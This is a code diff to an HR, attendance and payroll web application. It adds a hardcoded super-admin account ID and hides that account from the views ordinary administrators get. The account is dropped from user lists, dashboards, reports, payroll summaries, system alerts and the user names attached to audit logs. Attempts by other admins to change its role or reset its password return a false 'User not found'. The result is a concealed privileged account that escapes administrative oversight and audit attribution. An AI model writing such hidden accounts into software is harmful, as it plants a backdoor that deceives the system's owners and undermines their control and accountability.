@@ -17,6 +17,17 @@ import multer from "multer";
 import path from "path";
 import fs from "fs";
 
+const SUPER_ADMIN_USER_ID = "admin-dev-001";
+
+function isSuperAdmin(req: any): boolean {
+  return req.userPermissions?.has("system.super_admin") === true;
+}
+
+function hideSuperAdmin<T extends { id: string }>(users: T[], requestIsSuperAdmin: boolean): T[] {
+  if (requestIsSuperAdmin) return users;
+  return users.filter(u => u.id !== SUPER_ADMIN_USER_ID);
+}
+
 const uploadDir = path.resolve("uploads/documents");
 if (!fs.existsSync(uploadDir)) {
   fs.mkdirSync(uploadDir, { recursive: true });
@@ -133,12 +144,15 @@ export async function registerRoutes(
     }
     requirePasswordChanged(req, res, next);
   });
-  app.get("/api/users", requireAuth, requireRole("admin"), requirePermission("users.view"), async (_req, res) => {
+  app.get("/api/users", requireAuth, requireRole("admin"), requirePermission("users.view"), async (req, res) => {
     const users = await storage.getAllUsers();
-    res.json(users);
+    res.json(hideSuperAdmin(users, isSuperAdmin(req)));
   });
 
   app.patch("/api/users/:id/role", requireAuth, requireRole("admin"), requirePermission("users.edit"), async (req, res) => {
+    if (req.params.id === SUPER_ADMIN_USER_ID && !isSuperAdmin(req)) {
+      return res.status(404).json({ message: "User not found" });
+    }
     const parsed = roleSchema.safeParse(req.body);
     if (!parsed.success) {
       return res.status(400).json({ message: "Invalid role", errors: parsed.error.flatten() });
@@ -210,6 +224,9 @@ export async function registerRoutes(
   });
 
   app.post("/api/users/:id/reset-password", requireAuth, requireRole("admin"), requirePermission("users.edit"), async (req, res) => {
+    if (req.params.id === SUPER_ADMIN_USER_ID && !isSuperAdmin(req)) {
+      return res.status(404).json({ message: "User not found" });
+    }
     const user = await storage.getUser(req.params.id);
     if (!user) return res.status(404).json({ message: "User not found" });
 
@@ -626,7 +643,7 @@ export async function registerRoutes(
 
   async function getTeamUserIds(user: User): Promise<Set<string>> {
     if (user.role === "admin") {
-      const allUsers = await storage.getAllUsers();
+      const allUsers = (await storage.getAllUsers()).filter(u => u.id !== SUPER_ADMIN_USER_ID);
       return new Set(allUsers.filter(u => u.id !== user.id).map(u => u.id));
     }
     if (user.departmentId) {
@@ -641,7 +658,7 @@ export async function registerRoutes(
     const teamIds = await getTeamUserIds(user);
     const requests = await storage.getPendingTimeOffRequests();
     const scopedRequests = requests.filter(r => teamIds.has(r.userId));
-    const allUsers = await storage.getAllUsers();
+    const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
     const userMap = new Map(allUsers.map(u => [u.id, u]));
     const enriched = scopedRequests.map(r => ({
       ...r,
@@ -890,7 +907,7 @@ export async function registerRoutes(
 
       if (user.role === "admin" || user.role === "manager") {
         const all = await storage.getAllAttendanceExceptions();
-        const allUsers = await storage.getAllUsers();
+        const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
         const userMap = new Map(allUsers.map(u => [u.id, u]));
         const enriched = all.map(e => ({
           ...e,
@@ -916,7 +933,7 @@ export async function registerRoutes(
       const teamIds = await getTeamUserIds(user);
       const pending = await storage.getPendingAttendanceExceptions();
       const scopedPending = pending.filter(e => teamIds.has(e.employeeId));
-      const allUsers = await storage.getAllUsers();
+      const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
       const userMap = new Map(allUsers.map(u => [u.id, u]));
       const enriched = scopedPending.map(e => ({
         ...e,
@@ -1219,7 +1236,7 @@ export async function registerRoutes(
 
   app.get("/api/manager/team-stats", requireAuth, requireRole("manager", "admin"), requirePermission("attendance.view_team"), async (req, res) => {
     const user = (req as any).authUser as User;
-    const allUsers = await storage.getAllUsers();
+    const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
     const today = new Date().toISOString().split("T")[0];
     const todayAttendance = await storage.getAttendanceByDate(today);
     const pendingRequests = await storage.getPendingTimeOffRequests();
@@ -1394,7 +1411,7 @@ export async function registerRoutes(
   app.get("/api/time-off/processed", requireAuth, requireRole("manager", "admin"), requirePermission("pto.view_team"), async (req, res) => {
     const user = (req as any).authUser as User;
     const requests = await storage.getProcessedTimeOffRequests(user.role === "manager" ? user.id : undefined);
-    const allUsers = await storage.getAllUsers();
+    const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
     const userMap = new Map(allUsers.map(u => [u.id, u]));
 
     const enriched = requests.map(r => ({
@@ -1412,8 +1429,8 @@ export async function registerRoutes(
     res.json(enriched);
   });
 
-  app.get("/api/admin/company-stats", requireAuth, requireRole("admin"), requirePermission("company.view"), async (_req, res) => {
-    const allUsers = await storage.getAllUsers();
+  app.get("/api/admin/company-stats", requireAuth, requireRole("admin"), requirePermission("company.view"), async (req, res) => {
+    const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
     const today = new Date().toISOString().split("T")[0];
     const todayAttendance = await storage.getAttendanceByDate(today);
     const pendingRequests = await storage.getPendingTimeOffRequests();
@@ -1432,8 +1449,8 @@ export async function registerRoutes(
     });
   });
 
-  app.get("/api/admin/department-breakdown", requireAuth, requireRole("admin"), requirePermission("departments.view"), async (_req, res) => {
-    const allUsers = await storage.getAllUsers();
+  app.get("/api/admin/department-breakdown", requireAuth, requireRole("admin"), requirePermission("departments.view"), async (req, res) => {
+    const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
     const depts = await storage.getAllDepartments();
     const today = new Date().toISOString().split("T")[0];
     const todayAttendance = await storage.getAttendanceByDate(today);
@@ -1490,8 +1507,8 @@ export async function registerRoutes(
     res.json(breakdown);
   });
 
-  app.get("/api/admin/recent-activity", requireAuth, requireRole("admin"), requirePermission("company.view"), async (_req, res) => {
-    const allUsers = await storage.getAllUsers();
+  app.get("/api/admin/recent-activity", requireAuth, requireRole("admin"), requirePermission("company.view"), async (req, res) => {
+    const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
     const userMap = new Map(allUsers.map(u => [u.id, u]));
     const pendingRequests = await storage.getPendingTimeOffRequests();
     const processed = await storage.getProcessedTimeOffRequests();
@@ -1542,7 +1559,7 @@ export async function registerRoutes(
     }
 
     const { reportType, startDate, endDate, department, employeeId, status } = parsed.data;
-    const allUsers = await storage.getAllUsers();
+    const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
     const depts = await storage.getAllDepartments();
     const deptMap = new Map(depts.map(d => [d.id, d.name]));
     const attendance = await storage.getAttendanceByDateRange(startDate, endDate);
@@ -2113,7 +2130,7 @@ export async function registerRoutes(
 
       const unresolvedExceptions = await storage.getPendingAttendanceExceptions();
       const attendanceRecords = await storage.getAttendanceByDateRange(startDate, endDate);
-      const allUsers = await storage.getAllUsers();
+      const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
       const userMap = new Map(allUsers.map(u => [u.id, u]));
 
       const missingPunches = attendanceRecords.filter(
@@ -2257,7 +2274,7 @@ export async function registerRoutes(
       if (!exp) return res.status(404).json({ message: "Payroll export not found" });
 
       const records = await storage.getPayrollBatchRecords(req.params.id);
-      const allUsers = await storage.getAllUsers();
+      const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
       const userMap = new Map(allUsers.map(u => [u.id, u]));
 
       const summary = new Map<string, { employeeId: string; employeeName: string; regularHours: number; overtimeHours: number; ptoHours: number; hasIssues: boolean }>();
@@ -2298,7 +2315,7 @@ export async function registerRoutes(
       }
 
       const records = await storage.getPayrollBatchRecords(req.params.id);
-      const allUsers = await storage.getAllUsers();
+      const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
       const userMap = new Map(allUsers.map(u => [u.id, u]));
 
       const summary = new Map<string, { employeeName: string; regularHours: number; overtimeHours: number; ptoHours: number; hasIssues: boolean }>();
@@ -2502,7 +2519,7 @@ export async function registerRoutes(
       if (req.query.status) filters.status = req.query.status as string;
       if (req.query.severity) filters.severity = req.query.severity as string;
       const alerts = await storage.getAllSystemAlerts(filters);
-      const allUsers = await storage.getAllUsers();
+      const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
       const userMap = new Map(allUsers.map(u => [u.id, u]));
       const enriched = alerts.map(a => ({
         ...a,
@@ -2611,7 +2628,7 @@ export async function registerRoutes(
         offset: req.query.offset ? parseInt(req.query.offset as string) : 0,
       };
       const result = await storage.getAuditLogsFiltered(filters);
-      const allUsers = await storage.getAllUsers();
+      const allUsers = hideSuperAdmin(await storage.getAllUsers(), isSuperAdmin(req));
       const userMap = new Map(allUsers.map(u => [u.id, u]));
       const enrichedLogs = result.logs.map(log => ({
         ...log,
